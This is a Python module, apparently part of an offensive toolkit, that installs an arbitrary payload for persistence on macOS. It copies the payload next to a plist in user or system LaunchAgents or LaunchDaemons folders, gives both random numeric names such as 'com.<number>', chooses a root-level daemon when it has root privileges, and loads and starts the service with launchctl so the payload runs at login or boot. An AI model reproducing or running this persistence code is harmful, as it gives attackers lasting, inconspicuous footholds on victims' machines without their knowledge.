"""
macos.py: macOS-specific persistence logic.
"""

import os
import enum
import random
import platform
import plistlib
import subprocess

from pathlib import Path

from support.core import Persistence

if platform.system() == "Darwin":
    import py_sip_xnu
else:
    py_sip_xnu = None


BIN_ID:        str = "/usr/bin/id"
BIN_LAUNCHCTL: str = "/bin/launchctl"


class MacPersistenceMethods(enum.Enum):
    """
    macOS-specific persistence methods.
    """

    LAUNCH_AGENT_USER     = "LaunchAgent - Current User"
    LAUNCH_AGENT_LIBRARY  = "LaunchAgent - Library"
    LAUNCH_DAEMON_LIBRARY = "LaunchDaemon - Library"

    # Gated behind System Integrity Protection (SIP).
    # LAUNCH_AGENT_SYSTEM   = "LaunchAgent - System"
    # LAUNCH_DAEMON_SYSTEM  = "LaunchDaemon - System"


class MacPersistence(Persistence):
    """
    macOS-specific persistence logic.

    identifier: Effective user ID of the user to install the payload as.
    """

    def __init__(self, payload: str, identifier: int, custom_method: str = None) -> None:
        super().__init__(payload, identifier, custom_method)

        # Inherited from Persistence class:
        self.payload
        self.identifier
        self.custom_method
        self.temp_dir
        self.recommended_method

        self.xnu_version = self._get_xnu_version()


    def _get_xnu_version(self) -> str:
        """
        Get major XNU version.
        """
        return platform.release().split(".")[0]


    def _determine_recommended_persistence_method(self) -> str:
        """
        Determine the recommended persistence method for macOS.
        """
        # If we lack root access, we can only use user-level persistence methods.
        if self.identifier != 0:
            return MacPersistenceMethods.LAUNCH_AGENT_USER.value

        # if py_sip_xnu.SipXnu().sip_object.can_edit_root:
        #     return MacPersistenceMethods.LAUNCH_DAEMON_SYSTEM.value

        return MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value


    def supported_persistence_methods(self) -> list:
        """
        Get a list of supported persistence methods for macOS.
        """
        return [method.value for method in MacPersistenceMethods]


    def _current_user_id(self) -> str:
        """
        Get the current user's ID.
        """
        return subprocess.run([BIN_ID, "-u", os.getlogin()], capture_output=True, text=True).stdout.strip()


    def _build_launch_service(self, name: str, arguments: list, enviroment_variables: dict = None) -> dict:
        """
        Build a launch service.
        """
        return {
            "Label": name,
            "ProgramArguments": arguments,
            "RunAtLoad": True,
            **({"EnvironmentVariables": enviroment_variables} if enviroment_variables else {})
        }


    def _start_launch_service(self, service_path: str) -> bool:
        """
        Start launch service.

        Returns True if the service was started successfully, False otherwise.
        """

        if Path(service_path).parent.name == "LaunchAgents":
            current_user_id = self._current_user_id()

            result = subprocess.run(
                [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "load", "-w", service_path],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                print(result.stdout)
                if result.stderr:
                    print(result.stderr)
                return False

            result = subprocess.run(
                [BIN_LAUNCHCTL, "asuser", current_user_id, BIN_LAUNCHCTL, "start", Path(service_path).stem],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                print(result.stdout)
                if result.stderr:
                    print(result.stderr)
                return False
        elif Path(service_path).parent.name == "LaunchDaemons":
            result = subprocess.run(
                [BIN_LAUNCHCTL, "load", "-w", service_path],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                print(result.stdout)
                if result.stderr:
                    print(result.stderr)
                return False

            result = subprocess.run(
                [BIN_LAUNCHCTL, "start", Path(service_path).stem],
                capture_output=True,
                text=True
            )
            if result.returncode != 0:
                print(result.stdout)
                if result.stderr:
                    print(result.stderr)
                return False
        else:
            raise ValueError(f"Unknown service path {service_path}")

        return True


    def _install_generic_launch_service(self, variant: str, randomize_name: bool = True) -> None:
        """
        Install launch service.
        """

        print(f"Installing launch service ({variant})")

        service_directory = ""
        if variant == MacPersistenceMethods.LAUNCH_AGENT_USER.value:
            service_directory = Path("~/Library/LaunchAgents").expanduser()
        elif variant == MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value:
            service_directory = Path("/Library/LaunchAgents")
        elif variant == MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value:
            service_directory = Path("/Library/LaunchDaemons")
        else:
            raise NotImplementedError(f"Unknown variant {variant}")

        service_directory.mkdir(parents=True, exist_ok=True)

        service_name = f"com.{random.randint(0, 1000000)}"
        service_file = service_directory / f"{service_name}.plist"
        service_file.touch()

        service_file_path = service_file.resolve()

        # Copy payload file to safe location.
        payload_new_name = f"{random.randint(0, 1000000)}" if randomize_name else Path(self.payload).name
        payload_file = service_directory / payload_new_name
        subprocess.run(["cp", self.payload, str(payload_file)], capture_output=True, text=True)

        print(f"  Relocated payload: {payload_file}")
        print(f"  Service file: {service_file_path}")

        plistlib.dump(self._build_launch_service(name=service_name, arguments=[str(payload_file)]), service_file_path.open("wb"))

        if not self._start_launch_service(str(service_file_path)):
            raise RuntimeError("Failed to start launch service.")

        print("  Service started successfully 🎉")


    def install(self) -> None:
        method = self.configured_persistence_method()

        if method in [
            MacPersistenceMethods.LAUNCH_AGENT_USER.value,
            MacPersistenceMethods.LAUNCH_AGENT_LIBRARY.value,
            MacPersistenceMethods.LAUNCH_DAEMON_LIBRARY.value
        ]:
            self._install_generic_launch_service(method)
        else:
            raise NotImplementedError(f"Method {method} not implemented.")